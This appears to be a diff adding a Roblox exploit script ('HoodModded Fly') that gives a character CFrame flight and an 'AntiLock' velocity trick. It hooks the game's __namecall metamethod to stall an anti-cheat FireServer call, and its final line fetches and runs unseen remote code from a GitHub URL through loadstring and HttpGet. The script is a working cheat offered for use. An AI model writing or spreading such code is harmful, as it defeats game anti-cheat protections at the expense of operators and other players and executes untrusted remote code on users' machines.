@@ -1,2 +1,315 @@
 -- Use Loadstring Pls 
+--[O-B-F-U-S-C-A-T-E]-
+game.StarterGui:SetCore("SendNotification", {
+    Title = "HoodModded Fly",
+    Text =  "discord.gg/SBcHa5pRWK",
+    Icon = "rbxassetid://1362932274",
+    Duration = 3,
+})
 
+--//Variables
+local Player = game.Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local Mouse = Player:GetMouse()
+
+local UserInputService = game:GetService('UserInputService')
+local RunService = game:GetService('RunService')
+
+local Players = game.Players
+local Camera = workspace.Camera
+local Speed = 1
+local FlyConnection;
+local MouseDown = nil
+local MouseUp = nil
+
+
+--//Animations
+local IdleTrack = Instance.new("Animation",game:GetService("ReplicatedStorage"))
+IdleTrack.AnimationId = "rbxassetid://9737194696"
+
+
+local ForwardTrack = Instance.new("Animation",game:GetService("ReplicatedStorage"))
+ForwardTrack.AnimationId = "rbxassetid://9737197813"
+
+
+local BackwardTrack = Instance.new("Animation",game:GetService("ReplicatedStorage"))
+BackwardTrack.AnimationId = "rbxassetid://9737201368"
+
+
+local LeftTrack = Instance.new("Animation",game:GetService("ReplicatedStorage"))
+LeftTrack.AnimationId = "rbxassetid://9736797791"
+
+
+local RightTrack = Instance.new("Animation",game:GetService("ReplicatedStorage"))
+RightTrack.AnimationId = "rbxassetid://9737207847"
+
+
+local Idle = Character.Humanoid.Animator:LoadAnimation(IdleTrack)
+local Forwards = Character.Humanoid.Animator:LoadAnimation(ForwardTrack)
+local Backwards = Character.Humanoid.Animator:LoadAnimation(BackwardTrack)
+local Left = Character.Humanoid.Animator:LoadAnimation(LeftTrack)
+local Right = Character.Humanoid.Animator:LoadAnimation(RightTrack)
+
+
+Idle.Priority = Enum.AnimationPriority.Idle
+Forwards.Priority = Enum.AnimationPriority.Movement
+Backwards.Priority = Enum.AnimationPriority.Movement
+Left.Priority = Enum.AnimationPriority.Movement
+Right.Priority = Enum.AnimationPriority.Movement
+
+Player.CharacterAdded:Connect(function(NewCharacter)
+    Character = NewCharacter
+    Character:WaitForChild("Humanoid")
+    Idle = Character.Humanoid.Animator:LoadAnimation(IdleTrack)
+    Forwards = Character.Humanoid.Animator:LoadAnimation(ForwardTrack)
+    Backwards = Character.Humanoid.Animator:LoadAnimation(BackwardTrack)
+    Left = Character.Humanoid.Animator:LoadAnimation(LeftTrack)
+    Right = Character.Humanoid.Animator:LoadAnimation(RightTrack)
+end)
+
+
+PlatformStand = function(Active)
+    if Character then
+        if Character:FindFirstChild('Humanoid') then
+           Character.Humanoid.PlatformStand = Active
+        end
+    end
+end
+
+function SendNotif(t,tx)
+game.StarterGui:SetCore("SendNotification", {
+    Title = t,
+    Text =  tx,
+    Duration = 5,
+   })
+end
+
+DisconnectConnection = function(connection)
+    if connection then
+        connection:Disconnect()
+    end
+end
+
+
+
+CheckForVelocity = function()
+    local succ,err = pcall(function()
+         for i,v in pairs(Character.Humanoid.Animator:GetPlayingAnimationTracks()) do
+             v:Destroy()
+         end
+    end)
+    if err then
+       warn(err)
+    end
+     
+     Idle:Play()
+     
+     local binds = {"w","a","s","d"}
+     
+     MouseDown = Mouse.KeyDown:Connect(function(key)
+        if key == "w" then
+            Forwards:Play()
+        elseif key == "a" then
+            Left:Play()
+        elseif key == "s" then
+            Backwards:Play()
+        elseif key == "d" then
+            Right:Play()
+        end
+     end)
+
+     MouseUp = Mouse.KeyUp:Connect(function(key)
+        if key == "w" then
+            Forwards:Stop()
+        elseif key == "a" then
+            Left:Stop()
+        elseif key == "s" then
+            Backwards:Stop()
+        elseif key == "d" then
+            Right:Stop()
+        end
+     end)
+     
+     if Character and Character:FindFirstChild('HumanoidRootPart')  then
+        local part1 = Instance.new("Part");part1.Name = "Part1"
+           part1.Parent = workspace.Camera;part1.Anchored = true; part1.Massless = true
+           part1.CanCollide = false ;part1.Transparency = 1
+    
+           FlyConnection = RunService.Stepped:connect(function()
+              part1.CFrame = workspace.CurrentCamera.CoordinateFrame + Vector3.new(0,0,-5) 
+           end)
+	
+	       local attachment1 = Instance.new("Attachment");attachment1.Parent = part1
+	       local attachment0 = Instance.new("Attachment");attachment0.Parent = Character.HumanoidRootPart
+	
+	       local alignOrientation = Instance.new("AlignOrientation");alignOrientation.Parent = attachment0
+           alignOrientation.Attachment0 = attachment0;alignOrientation.Attachment1 = attachment1;alignOrientation.RigidityEnabled = true
+	
+	   local VelocityT = Instance.new('LinearVelocity');VelocityT.MaxForce = math.huge;VelocityT.Parent = attachment0
+    VelocityT.VectorVelocity = Vector3.new(0,0,0);VelocityT.Attachment0 = attachment0   
+   end
+end
+
+RemoveVelocity = function()
+    DisconnectConnection(MouseUp)
+    DisconnectConnection(MouseDown)
+    Idle:Stop()
+    Forwards:Stop()
+    Backwards:Stop()
+    Left:Stop()
+    Right:Stop()
+    pcall(function() workspace.Camera.Part1:Destroy()  end)
+    pcall(function() Character.HumanoidRootPart.Attachment:Destroy() end)
+    DisconnectConnection(FlyConnection)
+end
+
+function AntiLockLoop()
+    if Character then
+       local function GetParts()
+       local Parts = {}
+       for _,parts in next,Character:GetChildren() do
+               if parts:IsA("BasePart") then
+                  table.insert(Parts,parts)
+               end
+            end
+           return Parts
+       end
+       local BaseParts = GetParts()
+       for i,Part in next,BaseParts do
+          coroutine.resume(coroutine.create(function()
+            local OldVelocity = Part.Velocity
+            Part.Velocity = Vector3.new(OldVelocity.X, -200, OldVelocity.Z)
+            Part.Velocity = Vector3.new(OldVelocity.X, OldVelocity.Y, OldVelocity.Z)
+            Part.Velocity = Vector3.new(OldVelocity.X, -200, OldVelocity.Z)
+          end))
+       end
+       Character.Humanoid.HipHeight = 8
+    end
+end
+
+local mt = getrawmetatable(game)
+    local old = mt.__namecall
+    setreadonly(mt, false)
+    mt.__namecall = newcclosure(function(...)
+        local args = {...}
+        if getnamecallmethod() == "FireServer" and args[2] == "MousePos" and args[3] == " " then
+                warn('Bypassed Anti-Cheat')
+                wait(9e9)
+            return 
+        end
+    return old(...)
+end)
+    
+Settings = {
+    Active = false,
+    Left = false,
+    Right = false,
+    Forwards = false,
+    Backwards = false,
+    Up = false,
+    Down = false
+}
+KeyBind = KeyBind:upper()
+UserInputService.InputBegan:Connect(function(k,t)
+    if t then return end
+     if k.KeyCode == Enum.KeyCode[KeyBind] then
+        Settings.Active = not Settings.Active
+        if not Settings.Active then
+            RemoveVelocity()
+            PlatformStand(false)
+            else
+            CheckForVelocity()
+            if getgenv().AntiLock then
+                warn("AntiLock True")
+            coroutine.resume(coroutine.create(function()
+                   repeat task.wait()
+                          AntiLockLoop()
+                   until not Settings.Active
+                   pcall(function() Character.Humanoid.HipHeight = 2 end)
+                end))
+            else
+                warn("AntiLock False")
+            end
+        end
+    end
+end)
+
+UserInputService.InputBegan:Connect(function(k,t)
+    if k.KeyCode == Enum.KeyCode.W then
+        Settings.Forwards = true
+    elseif 
+    k.KeyCode == Enum.KeyCode.A then
+        Settings.Left = true
+    elseif
+    k.KeyCode == Enum.KeyCode.S then
+        Settings.Backwards = true
+    elseif
+    k.KeyCode == Enum.KeyCode.D then
+        Settings.Right = true
+    elseif
+    k.KeyCode == Enum.KeyCode.E then
+        Settings.Up = true
+    elseif
+    k.KeyCode == Enum.KeyCode.Q then
+        Settings.Down = true
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(k,t)
+    if k.KeyCode == Enum.KeyCode.W then
+        Settings.Forwards = false
+    elseif 
+    k.KeyCode == Enum.KeyCode.A then
+        Settings.Left = false
+    elseif
+    k.KeyCode == Enum.KeyCode.S then
+        Settings.Backwards = false
+    elseif
+    k.KeyCode == Enum.KeyCode.D then
+        Settings.Right = false
+    elseif
+    k.KeyCode == Enum.KeyCode.E then
+        Settings.Up = false
+    elseif
+    k.KeyCode == Enum.KeyCode.Q then
+        Settings.Down = false
+    end
+end)
+
+
+RunService.Stepped:connect(function(time,delta)
+     if Character and Character:FindFirstChild('HumanoidRootPart') then
+        if Settings.Active then
+            if Settings.Forwards then
+                Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame + (Camera.CFrame.LookVector * Speed)
+            end
+            if Settings.Backwards then
+                Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame + (-Camera.CFrame.LookVector * Speed)
+            end
+            if Settings.Left then
+                Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame + (-Camera.CFrame.RightVector * Speed)
+            end
+            if Settings.Right then
+                Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame + (Camera.CFrame.RightVector * Speed)
+            end
+          --PlatformStand(true)
+       end
+    end
+end)
+
+Mouse.KeyDown:Connect(function(KEY)
+	if KEY:lower() == '-' then
+		if Settings.Active then
+           if Speed - 1 < 0 then return end
+           Speed = Speed - 1
+           SendNotif("CFrameFly","Speed: "..Speed)
+        end
+	elseif KEY:lower() == '=' then
+		if Settings.Active then
+          Speed = Speed + 1
+           SendNotif("CFrameFly","Speed: "..Speed)
+        end
+	end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nbayoungboyfan1964/AdminCommands/main/Commands"))()
